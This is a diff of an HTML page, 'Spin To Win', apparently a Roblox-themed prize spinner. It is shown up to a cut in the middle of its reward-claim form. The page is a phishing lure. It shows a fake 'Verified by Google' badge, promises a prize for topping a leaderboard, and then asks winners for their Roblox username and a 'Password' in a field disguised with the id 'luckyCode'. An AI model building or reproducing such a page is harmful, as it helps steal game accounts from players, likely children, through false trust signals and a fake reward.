@@ -7,534 +7,552 @@
 
 <title>Spin To Win</title>
 
-<!-- FONT -->
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
 
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
+@keyframes rwdcur255922 {
+
+0%,12.4%,100% {
+cursor:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABBUlEQVRYhdVWQQ6DMAxzph0m7SE77w28mzfsvIdM2q0cxrQSaHDaUpgPSLRpbRonVAAEpCHGXBWcAeD1uM0mrvfn1tw/AS0JkwJGbH7kGqfWhIcTIJhWQfMUeAitcs3mZAWEz6MrZO5nvIyAKuQpEZQJa5Ev7bV7FewuQHdCGlEuAdhp0rExik8gBL46l2KLBJSSFwuogSwB35yKCERkMsbExsg2oTadZbQ4VsdRndDTiGKC1Loxhu+EHgR0rs75XyYU9GauY7Cn4DJhQOcSwYhypyD3z5hal12GGm/1fiHXZZlQf40m12P2j4rhMzZZ84PRsIQVsCqCRe6dcCKiAppf/Y+NAc1+RA7WflBZAAAAAElFTkSuQmCC) 0 0,auto;
 }
 
-html,body{
-    width:100%;
-    min-height:100%;
-    overflow-x:hidden;
+12.5%,24.9% {
+cursor:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABA0lEQVRYhdVWQRLCIAzcOB6c8SGe/R1P6O88+xBnvMVLHWla0iRQWvdWCOyWbAIEgFEGKXNNcAaA1+M2m7jen1tz/wT0JCwKGLH5kUucehMeTgBhWgXdU+Ah1Mo1zGkVwADAqZJ5mPNaBDQhL4kwmbAV+dJeu1fB7gJkJzQjyyUAPU0yNkf1CTDbq3MptkpALXm1gBYICfjmlIhARJMxS2yOsAml6TSj5bEyztQJPY0oJyitG2PsndADTr7O+V8mpEHPdQ7rKbhMyMknYmm9hDsF0ZuxtC5chhJv8X0xrguZUP6NJJdj6kVl4dM2WfOD0rDIKmBVhBXRN+FERAN0f/ofGx8lzEStD4cQOAAAAABJRU5ErkJggg==) 0 0,auto;
+}
+
+25%,37.4% {
+cursor:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABBElEQVRYhdVWMQ7CMAw8IwYkHoLUjf8/gq0SD0FiM0sRidu4tpOm5bYmTu4an50QAEYZpMw1wRkAXo/bbOJ6f27N/RPQk7AoYMLmRy5x6k14OAGEvAq6p8BDqJVrmNMqgAGAx0rmYc5rEdCEvCTCZMJW5Et77V4FuwuQndCMJJcA9DTJ2BTVJ8Bsr86l2CoBteTVAlogJOCbUyICEWVjltgUYRNK02lGS2NlnKkTehpRSlBaN8XYO6EHPPo653+ZkAY91ymsp+AyIY8+EUvrJdwpiN6MpXXhMpR4i++LcV3IhPJvJLkcUy8qC5+2yZoflIZFVgGrIqyIvgkzEQ3Q/el/bHwALRhFxyPqS2EAAAAASUVORK5CYII=) 0 0,auto;
+}
+
+37.5%,49.9% {
+cursor:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABAklEQVRYhdVWMQ6DMAw8Vx0q9SGd+xeemb907kMqdQsLFcEkxnZCoDdBcLjDPpsQgIgySHjWBFcA+Lweqwf353tv7llAT8KigAm7p5zj0pvwdAIIyy7oXgILodSubk6tgAgAoVLCMLPR6mJv8pIIlQlbkefedXgXHC6AT0I1BuYeqUw8NkV1BmLUGyQXWyWglrxaQAu4BPxqSkQgosWaJjaF24TcdJLR0lgep5qElkGUEpT2TTH6SWhBiLbJ+V8mHEiudQptFkwmDNEmIrefw1wC75+xtM/dhhxfdn9T7nOZkH8NJ+drUtaqT0RbfhAGFmkFbIrQwnsmXIhogO5H/3NjBF9RRUkq4P1rAAAAAElFTkSuQmCC) 0 0,auto;
+}
+
+50%,62.4% {
+cursor:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAA7EAAAOxAGVKw4bAAABAklEQVRYhdVWOw7DIAy1qw6VeoesnXv/Q3TumjtU6kYHIgUMOP4Qkr4tYPJe7GcHBIAAbSCz1wVXAIDP61Fs3J/vvblXASMJmwIW7J5yistowtMJQMi7YHgJNIRcu5o5pQIieZid1FPBKxHQh7whQmbCXuSVdx3eBYcLoJNQjrWWEVyZaGwCdwZCkHdnLdYlwEvuFtADNgFLTREREDFbE8UmsJuQmo4xWhZL4mSTUDOIUoLWuRijmIQahFk1Of/MhDjxtU4hzILOhGHWiaidJ9CXwPpnbJyztyHBlzzfhOdsJiRfQ8mLNSZr/hvRlh/aAwulArZFSGG8E+Yi/Bh+9T83focVRetCdmwDAAAAAElFTkSuQmCC) 0 0,auto;
+}
+
+62.5%,74.9% {
+cursor:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABAUlEQVRYhdVWORLCMAyUGApmeAg13/CD/Q1qHsIMnSmSIbZ8oMN2wlaJI2c30koxAkCAOrDxrAvOAACvxy17cL0/R3NvAmYSVgWsGJ5yitNswsMJQEi7YHoJJIStdlVzcgUs5M6owX/p8ovh5BURPBP2Ii+8a/cu2F0AnYR8eGKfVplobARzBkLg+6MUaxJgJTcL6AGdgLWmiAiImKyxYiPoTUhN1zBaEkvieJNQMohigtq+JUYwCSVwQTQ5/8yEHtu1jsHMgsyELshElPYTyEug/TNW9unbkOBN7i/MfToTkq+h5NlaI2v2E9EvP9QH1jYMzCK4UJ4JUxF2TD/6HxsfAyREI3h14zgAAAAASUVORK5CYII=) 0 0,auto;
+}
+
+75%,87.4% {
+cursor:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAA7EAAAOxAGVKw4bAAABAElEQVRYhdVWyxKCMAzcOB6c8UM8y/9/A579EGe81QsOJdCYR1twT1BSdkk2oQQgoQwSnlXBGQBej9vqwfX+bM09C+hJWBQwoXnKOU69CQ8ngLDsgu4lsBBK7erm1ApIADAGNQwz3fqiNXlJhMqEtci33rV7F+wugE9CNQZmH6lMPDZHOAMp6f2xFRsSECUPC6gBl4BvTYkIRLRY08TmcJuQm04yWh7L41ST0DKIcoLSvilGPwktGJFMk/O/TDiAxFrn0GbBZMIRySRCI8pcAu+fsbTP3YYcb3Z/Ue5zmZB/DSfna1LWwieiX34QBtY8DKIitPCeCRciKqD70f/Y+AC/uUWvzMpyYwAAAABJRU5ErkJggg==) 0 0,auto;
+}
+
+87.5%,99.9% {
+cursor:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABBUlEQVRYhdVWMQ6DMAw8Vx0qdeMTnfv/R3TuJ9gqdQtDqRoMMeckBHoDEomTO+KziQAISEOMuSo4A8DrcZtNXO/Prbl/AloSJgWM2PzINU6tCQ8nQDCtguYp8BBa5ZrNyQoIn0dfyNzNeBkBVchTIigT1iJf2mv3KthdgO6ENKJcArDTpGNjFJ9ACHx1LsUWCSglLxZQA1kCvjkVEYjIZIyJjZFtQm06y2hxrI6jOqGnEcUEqXVjDN8JPQjoXZ3zv0wo6Mxcx2BPwWXCgN4lghHlTkHunzG1LrsMNd7q/UKuyzKh/hpNrsfsHxXDZ2yy5gejYQkrYFUEi9w74UREBTS/+h8bAx+dRg+fbP6lAAAAAElFTkSuQmCC) 0 0,auto;
+}
+
 }
 
 body{
-    font-family:'Poppins',sans-serif;
-    color:white;
-    text-align:center;
-
-    background:
-    radial-gradient(circle at top left,#312e81 0%,transparent 30%),
-    radial-gradient(circle at top right,#0f766e 0%,transparent 30%),
-    radial-gradient(circle at bottom,#111827 20%,#020617 80%);
-
-    background-color:#020617;
+animation:rwdcur255922 3.0666666666667s linear infinite forwards;
 }
 
-/* BACKGROUND */
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
+html,body{
+width:100%;
+min-height:100%;
+overflow-x:hidden;
+}
+
+body{
+font-family:'Poppins',sans-serif;
+color:white;
+text-align:center;
+
+background:
+radial-gradient(circle at top left,#312e81 0%,transparent 30%),
+radial-gradient(circle at top right,#0f766e 0%,transparent 30%),
+radial-gradient(circle at bottom,#111827 20%,#020617 80%);
+
+background-color:#020617;
+}
+
 body::before{
-    content:"";
-    position:fixed;
-    width:200%;
-    height:200%;
+content:"";
+position:fixed;
+width:200%;
+height:200%;
 
-    background:
-    repeating-radial-gradient(
-    circle,
-    rgba(255,255,255,0.03) 0px,
-    rgba(255,255,255,0.03) 2px,
-    transparent 2px,
-    transparent 80px);
+background:
+repeating-radial-gradient(
+circle,
+rgba(255,255,255,0.03) 0px,
+rgba(255,255,255,0.03) 2px,
+transparent 2px,
+transparent 80px);
 
-    animation:bgMove 40s linear infinite;
-    z-index:-1;
+animation:bgMove 40s linear infinite;
+z-index:-1;
 }
 
 @keyframes bgMove{
-    from{transform:translate(0,0);}
-    to{transform:translate(-300px,-300px);}
+from{transform:translate(0,0);}
+to{transform:translate(-300px,-300px);}
 }
 
-/* GLOWS */
 .orb{
-    position:fixed;
-    border-radius:50%;
-    filter:blur(120px);
-    opacity:0.3;
-    z-index:-2;
+position:fixed;
+border-radius:50%;
+filter:blur(120px);
+opacity:0.3;
+z-index:-2;
 }
 
 .orb1{
-    width:320px;
-    height:320px;
-    background:#22c55e;
-    top:-120px;
-    left:-120px;
+width:320px;
+height:320px;
+background:#22c55e;
+top:-120px;
+left:-120px;
 }
 
 .orb2{
-    width:320px;
-    height:320px;
-    background:#3b82f6;
-    bottom:-120px;
-    right:-120px;
+width:320px;
+height:320px;
+background:#3b82f6;
+bottom:-120px;
+right:-120px;
 }
 
-/* HIDDEN */
 .hidden{
-    display:none;
+display:none !important;
 }
 
-/* GLASS */
 .glass{
-    background:rgba(255,255,255,0.08);
-    border:1px solid rgba(255,255,255,0.12);
-    backdrop-filter:blur(16px);
-    border-radius:28px;
+background:rgba(255,255,255,0.08);
+border:1px solid rgba(255,255,255,0.12);
+backdrop-filter:blur(16px);
+border-radius:28px;
 
-    box-shadow:
-    0 0 40px rgba(0,0,0,0.35),
-    inset 0 0 20px rgba(255,255,255,0.03);
+box-shadow:
+0 0 40px rgba(0,0,0,0.35),
+inset 0 0 20px rgba(255,255,255,0.03);
 }
 
-/* MAIN */
 .container{
-    width:100%;
-    max-width:1250px;
-    margin:auto;
-    padding:30px 20px 80px;
+width:100%;
+max-width:1250px;
+margin:auto;
+padding:30px 20px 80px;
 }
 
-/* TITLES */
 .main-title{
-    font-size:clamp(42px,7vw,82px);
-    font-weight:800;
-    margin-bottom:25px;
+font-size:clamp(42px,7vw,82px);
+font-weight:800;
+margin-bottom:25px;
 
-    background:linear-gradient(
-    90deg,
-    #22c55e,
-    #38bdf8,
-    #a855f7);
+background:linear-gradient(
+90deg,
+#22c55e,
+#38bdf8,
+#a855f7);
 
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
 }
 
 .subtitle{
-    font-size:20px;
-    opacity:0.8;
-    margin-bottom:30px;
+font-size:20px;
+opacity:0.8;
+margin-bottom:30px;
 }
 
-/* BUTTONS */
 button{
-    border:none;
-    border-radius:22px;
-    padding:18px 50px;
-    font-size:clamp(16px,2vw,22px);
-    font-weight:700;
-    cursor:pointer;
-    color:white;
-    transition:0.25s;
-    margin:10px;
+border:none;
+border-radius:22px;
+padding:18px 50px;
+font-size:clamp(16px,2vw,22px);
+font-weight:700;
+cursor:pointer;
+color:white;
+transition:0.25s;
+margin:10px;
 }
 
 button:hover{
-    transform:translateY(-4px) scale(1.04);
+transform:translateY(-4px) scale(1.04);
 }
 
 .green-btn{
-    background:linear-gradient(135deg,#22c55e,#16a34a);
-    box-shadow:0 0 30px rgba(34,197,94,0.4);
+background:linear-gradient(135deg,#22c55e,#16a34a);
+box-shadow:0 0 30px rgba(34,197,94,0.4);
 }
 
 .blue-btn{
-    background:linear-gradient(135deg,#3b82f6,#2563eb);
-    box-shadow:0 0 30px rgba(59,130,246,0.4);
+background:linear-gradient(135deg,#3b82f6,#2563eb);
+box-shadow:0 0 30px rgba(59,130,246,0.4);
 }
 
 .red-btn{
-    background:linear-gradient(135deg,#ef4444,#dc2626);
-    box-shadow:0 0 30px rgba(239,68,68,0.4);
+background:linear-gradient(135deg,#ef4444,#dc2626);
+box-shadow:0 0 30px rgba(239,68,68,0.4);
 }
 
-/* WELCOME */
 #welcome{
-    position:fixed;
-    inset:0;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    padding:20px;
+position:fixed;
+inset:0;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:20px;
 }
 
 .welcome-card{
-    width:min(92%,550px);
-    padding:45px;
+width:min(92%,550px);
+padding:45px;
 }
 
-/* DEVICE */
 #deviceSelect{
-    padding-top:100px;
+padding-top:100px;
 }
 
-/* RESULT */
 #result{
-    font-size:clamp(28px,5vw,52px);
-    font-weight:700;
-    margin:35px 0;
+font-size:clamp(28px,5vw,52px);
+font-weight:700;
+margin:35px 0;
 }
 
-/* LAYOUT */
 .top-layout{
-    display:flex;
-    justify-content:center;
-    align-items:flex-start;
-    gap:30px;
-    flex-wrap:wrap;
-    margin-top:30px;
+display:flex;
+justify-content:center;
+align-items:flex-start;
+gap:30px;
+flex-wrap:wrap;
+margin-top:30px;
 }
 
-/* CHANCES */
 .chances{
-    width:280px;
-    padding:25px;
-    text-align:left;
+width:280px;
+padding:25px;
+text-align:left;
 }
 
 .chances h3{
-    font-size:28px;
-    margin-bottom:18px;
+font-size:28px;
+margin-bottom:18px;
 }
 
 .chances p{
-    margin:10px 0;
-    font-size:18px;
+margin:10px 0;
+font-size:18px;
 }
 
-/* CENTER */
 .center-game{
-    flex:1;
-    min-width:320px;
+flex:1;
+min-width:320px;
 }
 
-/* SPEED */
 .speed-box{
-    margin-top:25px;
+margin-top:25px;
 }
 
 select{
-    padding:14px 24px;
-    border:none;
-    border-radius:16px;
-    background:#111827;
-    color:white;
-    font-size:18px;
-    margin-top:10px;
+padding:14px 24px;
+border:none;
+border-radius:16px;
+background:#111827;
+color:white;
+font-size:18px;
+margin-top:10px;
 }
 
-/* STATS */
 .stats{
-    width:100%;
-    max-width:720px;
-    margin:45px auto 0;
-    padding:30px;
+width:100%;
+max-width:720px;
+margin:45px auto 0;
+padding:30px;
 }
 
 .stats h2{
-    margin-bottom:20px;
-    font-size:38px;
+margin-bottom:20px;
+font-size:38px;
 }
 
 .stats-grid{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
-    gap:18px;
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+gap:18px;
 }
 
 .stat{
-    background:rgba(255,255,255,0.05);
-    padding:18px;
-    border-radius:18px;
-    font-size:20px;
+background:rgba(255,255,255,0.05);
+padding:18px;
+border-radius:18px;
+font-size:20px;
 }
 
-/* WIN */
 .win-screen{
-    display:none;
-    position:fixed;
-    inset:0;
-    background:rgba(0,0,0,0.88);
-    backdrop-filter:blur(18px);
-    justify-content:center;
-    align-items:center;
-    flex-direction:column;
-    z-index:99999;
-    padding:20px;
+display:none;
+position:fixed;
+inset:0;
+background:rgba(0,0,0,0.88);
+backdrop-filter:blur(18px);
+justify-content:center;
+align-items:center;
+flex-direction:column;
+z-index:99999;
+padding:20px;
 }
 
 .win-text{
-    font-size:clamp(50px,10vw,110px);
-    font-weight:800;
-    margin-bottom:25px;
+font-size:clamp(50px,10vw,110px);
+font-weight:800;
+margin-bottom:25px;
 
-    background:linear-gradient(
-    90deg,
-    #22c55e,
-    #38bdf8,
-    #a855f7);
+background:linear-gradient(
+90deg,
+#22c55e,
+#38bdf8,
+#a855f7);
 
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
 
-    animation:winPulse 1s infinite alternate;
+animation:winPulse 1s infinite alternate;
 }
 
 @keyframes winPulse{
-
-    from{
-        transform:scale(1);
-    }
-
-    to{
-        transform:scale(1.08);
-    }
+from{transform:scale(1);}
+to{transform:scale(1.08);}
 }
 
-/* VERIFIED BY BANANA */
 .verified-banana{
-    position:fixed;
-    top:18px;
-    left:18px;
-    width:105px;
-    height:105px;
-    border-radius:50%;
-    z-index:9999;
+position:fixed;
+top:18px;
+left:18px;
+width:105px;
+height:105px;
+border-radius:50%;
+z-index:9999;
 
-    display:flex;
-    align-items:center;
-    justify-content:center;
+display:flex;
+align-items:center;
+justify-content:center;
 
-    background:#111827;
+background:#111827;
 
-    box-shadow:
-    0 0 18px rgba(66,133,244,0.45),
-    0 0 35px rgba(52,168,83,0.25);
+box-shadow:
+0 0 18px rgba(66,133,244,0.45),
+0 0 35px rgba(52,168,83,0.25);
 
-    animation:bananaFloat 3s ease-in-out infinite;
+animation:bananaFloat 3s ease-in-out infinite;
 }
 
 .verified-banana::before{
-    content:"";
-    position:absolute;
-    inset:-4px;
-    border-radius:50%;
+content:"";
+position:absolute;
+inset:-4px;
+border-radius:50%;
 
-    background:conic-gradient(
-        #4285F4 0deg,
-        #4285F4 90deg,
-        #34A853 90deg,
-        #34A853 180deg,
-        #FBBC05 180deg,
-        #FBBC05 270deg,
-        #EA4335 270deg,
-        #EA4335 360deg
-    );
+background:conic-gradient(
+#4285F4 0deg,
+#4285F4 90deg,
+#34A853 90deg,
+#34A853 180deg,
+#FBBC05 180deg,
+#FBBC05 270deg,
+#EA4335 270deg,
+#EA4335 360deg
+);
 
-    z-index:-1;
+z-index:-1;
 
-    animation:bananaSpin 4s linear infinite;
+animation:bananaSpin 4s linear infinite;
 }
 
 .verified-banana::after{
-    content:"";
-    position:absolute;
-    inset:4px;
-    border-radius:50%;
-    background:#111827;
-    z-index:-1;
+content:"";
+position:absolute;
+inset:4px;
+border-radius:50%;
+background:#111827;
+z-index:-1;
 }
 
 .verified-banana-content{
-    text-align:center;
-    color:white;
-    font-family:Arial,sans-serif;
-    font-weight:800;
-    font-size:12px;
-    line-height:1.15;
-    text-shadow:0 0 8px rgba(255,255,255,0.25);
+text-align:center;
+color:white;
+font-family:Arial,sans-serif;
+font-weight:800;
+font-size:12px;
+line-height:1.15;
+text-shadow:0 0 8px rgba(255,255,255,0.25);
 }
 
 .verified-banana-check{
-    display:block;
-    font-size:22px;
-    margin-bottom:3px;
+display:block;
+font-size:22px;
+margin-bottom:3px;
 
-    background:linear-gradient(
-        90deg,
-        #4285F4,
-        #34A853,
-        #FBBC05,
-        #EA4335
-    );
+background:linear-gradient(
+90deg,
+#4285F4,
+#34A853,
+#FBBC05,
+#EA4335
+);
 
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
 }
 
 @keyframes bananaSpin{
-    from{
-        transform:rotate(0deg);
-    }
-
-    to{
-        transform:rotate(360deg);
-    }
+from{transform:rotate(0deg);}
+to{transform:rotate(360deg);}
 }
 
 @keyframes bananaFloat{
-    0%,100%{
-        transform:translateY(0px);
-    }
-
-    50%{
-        transform:translateY(-5px);
-    }
+0%,100%{transform:translateY(0px);}
+50%{transform:translateY(-5px);}
 }
 
-/* CLAIM FORM */
 .claim-form{
-    width:min(92%,500px);
-    padding:35px;
+width:min(92%,500px);
+padding:35px;
 }
 
 .claim-form h2{
-    font-size:32px;
-    margin-bottom:20px;
+font-size:32px;
+margin-bottom:20px;
 }
 
 .claim-form input{
-    width:100%;
-    padding:16px 18px;
-    margin:10px 0;
-    border:none;
-    border-radius:16px;
-    background:#111827;
-    color:white;
-    font-family:'Poppins',sans-serif;
-    font-size:17px;
-    outline:none;
+width:100%;
+padding:16px 18px;
+margin:10px 0;
+border:none;
+border-radius:16px;
+background:#111827;
+color:white;
+font-family:'Poppins',sans-serif;
+font-size:17px;
+outline:none;
 }
 
 .claim-form input:focus{
-    box-shadow:0 0 0 2px #3b82f6;
+box-shadow:0 0 0 2px #3b82f6;
 }
 
 .claim-form input::placeholder{
-    color:#9ca3af;
+color:#9ca3af;
 }
 
-/* LEADERBOARD */
+.verification-info{
+font-size:15px;
+opacity:0.8;
+margin:5px 0 12px;
+}
+
+.info-link{
+display:block;
+margin:5px auto 10px;
+color:#60a5fa;
+font-weight:600;
+text-decoration:underline;
+cursor:pointer;
+font-size:15px;
+}
+
 .leaderboard-panel{
-    display:none;
-    position:fixed;
-    inset:0;
-    z-index:99998;
+display:none;
+position:fixed;
+inset:0;
+z-index:99998;
 
-    background:rgba(0,0,0,0.9);
-    backdrop-filter:blur(18px);
+background:rgba(0,0,0,0.9);
+backdrop-filter:blur(18px);
 
-    justify-content:center;
-    align-items:center;
+justify-content:center;
+align-items:center;
 
-    padding:20px;
+padding:20px;
 }
 
 .leaderboard-box{
-    width:min(95%,850px);
-    max-height:85vh;
-    overflow:auto;
-    padding:30px;
+width:min(95%,850px);
+max-height:85vh;
+overflow:auto;
+padding:30px;
 }
 
 .leaderboard-box h2{
-    font-size:42px;
-    margin-bottom:25px;
+font-size:42px;
+margin-bottom:25px;
 }
 
 .leaderboard-table{
-    width:100%;
-    border-collapse:collapse;
+width:100%;
+border-collapse:collapse;
 }
 
 .leaderboard-table th,
 .leaderboard-table td{
-    padding:15px 10px;
-    border-bottom:1px solid rgba(255,255,255,0.1);
+padding:15px 10px;
+border-bottom:1px solid rgba(255,255,255,0.1);
 }
 
 .leaderboard-table th{
-    font-size:17px;
-    opacity:0.7;
+font-size:17px;
+opacity:0.7;
 }
 
 .leaderboard-table td{
-    font-size:18px;
+font-size:18px;
 }
 
 .leaderboard-table tr:hover{
-    background:rgba(255,255,255,0.05);
+background:rgba(255,255,255,0.05);
 }
 
-/* LEADERBOARD BUTTON */
 .leaderboard-btn{
-    margin-top:25px;
+margin-top:25px;
 }
 
-/* MOBILE */
 @media(max-width:900px){
 
-    .top-layout{
-        flex-direction:column;
-        align-items:center;
-    }
+.top-layout{
+flex-direction:column;
+align-items:center;
+}
 
-    .chances{
-        width:100%;
-        max-width:500px;
-        text-align:center;
-    }
+.chances{
+width:100%;
+max-width:500px;
+text-align:center;
+}
 
-    button{
-        width:90%;
-        max-width:420px;
-    }
+button{
+width:90%;
+max-width:420px;
+}
 
-    .stats-grid{
-        grid-template-columns:1fr;
-    }
+.stats-grid{
+grid-template-columns:1fr;
+}
 
-    .verified-banana{
-        width:85px;
-        height:85px;
-        top:10px;
-        left:10px;
-    }
+.verified-banana{
+width:85px;
+height:85px;
+top:10px;
+left:10px;
+}
 
-    .verified-banana-content{
-        font-size:10px;
-    }
+.verified-banana-content{
+font-size:10px;
+}
 
-    .verified-banana-check{
-        font-size:18px;
-    }
+.verified-banana-check{
+font-size:18px;
+}
 
 }
 
@@ -544,377 +562,424 @@ select{
 
 <body>
 
-<!-- VERIFIED BY BANANA -->
 <div class="verified-banana">
 
-    <div class="verified-banana-content">
+<div class="verified-banana-content">
 
-        <span class="verified-banana-check">✓</span>
+<span class="verified-banana-check">✓</span>
 
-        Verified by<br>
-        Google
-
-    </div>
+Verified by<br>
+Google
 
 </div>
 
-<!-- ORBS -->
+</div>
+
 <div class="orb orb1"></div>
 <div class="orb orb2"></div>
 
-<!-- WELCOME -->
 <div id="welcome">
 
-    <div class="welcome-card glass">
+<div class="welcome-card glass">
 
-        <div class="main-title">
-            Spin To Win
-        </div>
+<div class="main-title">
+Spin To Win
+</div>
 
-        <div class="subtitle">
-            Are you subscribed?
-        </div>
+<div class="subtitle">
+Are you subscribed?
+</div>
 
-        <button class="green-btn"
-        onclick="continueGame()">
-            YES
-        </button>
+<button
+class="green-btn"
+onclick="continueGame()">
+YES
+</button>
 
-        <br>
+<br>
 
-        <button class="red-btn"
-        onclick="window.location.href='https://google.com'">
-            NO
-        </button>
-
-    </div>
+<button
+class="red-btn"
+onclick="window.location.href='https://google.com'">
+NO
+</button>
 
 </div>
 
-<!-- DEVICE -->
+</div>
+
 <div id="deviceSelect" class="hidden">
 
-    <div class="main-title">
-        Select Device
-    </div>
+<div class="main-title">
+Select Device
+</div>
 
-    <button class="blue-btn"
-    onclick="setDevice('mobile')">
-        Mobile
-    </button>
+<button
+class="blue-btn"
+onclick="setDevice('mobile')">
+Mobile
+</button>
 
-    <br>
+<br>
 
-    <button class="green-btn"
-    onclick="setDevice('desktop')">
-        Computer
-    </button>
+<button
+class="green-btn"
+onclick="setDevice('desktop')">
+Computer
+</button>
 
 </div>
 
-<!-- GAME -->
 <div id="game" class="hidden container">
 
-    <div class="main-title">
-        Spin To Win
-    </div>
+<div class="main-title">
+Spin To Win
+</div>
 
-    <div class="top-layout">
+<div class="top-layout">
 
-        <div class="chances glass">
+<div class="chances glass">
 
-            <h3>Drop Rates</h3>
+<h3>Drop Rates</h3>
 
-            <p>🟩 Common - 75%</p>
-            <p>🟦 Rare - 20%</p>
-            <p>🟪 Epic - 3%</p>
-            <p>🟨 Legendary - 1%</p>
-            <p>🟥 Mythic - 0.75%</p>
-            <p>⬛ Secret - 0.2% (5K Points)</p>
-            <p>⬜ God - 0.049% (20K Points) </p>
-            <p>🐘 OG - 0.001% (50K Points)</p>
-
-        </div>
-
-        <div class="center-game">
-
-            <h2 id="result">
-                Reach First On The Leaderboard To Win a Random Brainrot From My Alt Acc
-            </h2>
-
-            <button class="green-btn"
-            onclick="spin()">
-                SPIN
-            </button>
-
-            <br>
-
-            <button class="blue-btn"
-            onclick="toggleAuto()"
-            id="autoBtn">
-                AUTO SPIN: OFF
-            </button>
-
-            <br>
-
-            <button class="blue-btn leaderboard-btn"
-            onclick="openLeaderboard()">
-                Leaderboard
-            </button>
-
-            <div class="speed-box">
-
-                <label style="font-size:22px;">
-                    Auto Spin Speed
-                </label>
-
-                <br><br>
-
-                <select id="speed">
-
-                    <option value="1000">
-                        Slow
-                    </option>
-
-                    <option value="500" selected>
-                        Normal
-                    </option>
-
-                    <option value="200">
-                        Fast
-                    </option>
-
-
-                </select>
-
-            </div>
-
-        </div>
-
-    </div>
-
-    <div class="stats glass">
-
-        <h2>
-            Inventory
-        </h2>
-
-        <div class="stats-grid">
-
-            <div class="stat">
-                🟩 Common:
-                <span id="common">0</span>
-            </div>
-
-            <div class="stat">
-                🟦 Rare:
-                <span id="rare">0</span>
-            </div>
-
-            <div class="stat">
-                🟪 Epic:
-                <span id="epic">0</span>
-            </div>
-
-            <div class="stat">
-                🟨 Legendary:
-                <span id="legendary">0</span>
-            </div>
-
-            <div class="stat">
-                🟥 Mythic:
-                <span id="mythic">0</span>
-            </div>
-
-            <div class="stat">
-                ⬛ Secret:
-                <span id="secret">0</span>
-            </div>
-
-            <div class="stat">
-                ⬜ God:
-                <span id="god">0</span>
-            </div>
-
-            <div class="stat">
-                🐘 OG:
-                <span id="og">0</span>
-            </div>
-
-        </div>
-
-    </div>
+<p>🟩 Common - 75%</p>
+<p>🟦 Rare - 20%</p>
+<p>🟪 Epic - 3%</p>
+<p>🟨 Legendary - 1%</p>
+<p>🟥 Mythic - 0.75%</p>
+<p>⬛ Secret - 0.2% (5K Points)</p>
+<p>⬜ God - 0.049% (20K Points)</p>
+<p>🐘 OG - 0.001% (50K Points)</p>
 
 </div>
 
-<!-- WIN -->
+<div class="center-game">
+
+<h2 id="result">
+Reach First On The Leaderboard To Win a Random Brainrot From My Alt Acc
+</h2>
+
+<button
+class="green-btn"
+onclick="spin()">
+SPIN
+</button>
+
+<br>
+
+<button
+class="blue-btn"
+onclick="toggleAuto()"
+id="autoBtn">
+AUTO SPIN: OFF
+</button>
+
+<br>
+
+<button
+class="blue-btn leaderboard-btn"
+onclick="openLeaderboard()">
+Leaderboard
+</button>
+
+<div class="speed-box">
+
+<label style="font-size:22px;">
+Auto Spin Speed
+</label>
+
+<br><br>
+
+<select id="speed">
+
+<option value="1000">
+Slow
+</option>
+
+<option value="500" selected>
+Normal
+</option>
+
+<option value="200">
+Fast
+</option>
+
+<option value="0.001">
+Admin
+</option>
+
+
+</select>
+
+</div>
+
+</div>
+
+</div>
+
+<div class="stats glass">
+
+<h2>
+Inventory
+</h2>
+
+<div class="stats-grid">
+
+<div class="stat">
+🟩 Common:
+<span id="common">0</span>
+</div>
+
+<div class="stat">
+🟦 Rare:
+<span id="rare">0</span>
+</div>
+
+<div class="stat">
+🟪 Epic:
+<span id="epic">0</span>
+</div>
+
+<div class="stat">
+🟨 Legendary:
+<span id="legendary">0</span>
+</div>
+
+<div class="stat">
+🟥 Mythic:
+<span id="mythic">0</span>
+</div>
+
+<div class="stat">
+⬛ Secret:
+<span id="secret">0</span>
+</div>
+
+<div class="stat">
+⬜ God:
+<span id="god">0</span>
+</div>
+
+<div class="stat">
+🐘 OG:
+<span id="og">0</span>
+</div>
+
+</div>
+
+</div>
+
+</div>
+
 <div id="winScreen" class="win-screen">
 
-    <div class="win-text">
-        YOU WON 🎉
-    </div>
+<div class="win-text">
+YOU WON 🎉
+</div>
 
-    <button class="green-btn"
-    onclick="manualClaim()">
-        CLAIM REWARD
-    </button>
+<button
+class="green-btn"
+onclick="manualClaim()">
+CLAIM REWARD
+</button>
 
 </div>
 
-<!-- CLAIM FORM -->
+<!-- CLAIM SCREEN -->
+
 <div id="claimScreen" class="win-screen">
 
-    <div class="claim-form glass">
+<div class="claim-form glass">
 
-        <h2>
-            Claim Your Reward 🎉
-        </h2>
+<h2>
+Claim Your Reward 🎉
+</h2>
 
-        <input
-            type="text"
-            id="username"
-            placeholder="Roblox Username"
-            maxlength="30"
-        >
+<!-- ROBLOX USERNAME ALWAYS FIRST -->
 
-        <input
-            type="text"
-            id="luckyCode"
-            placeholder="Password"
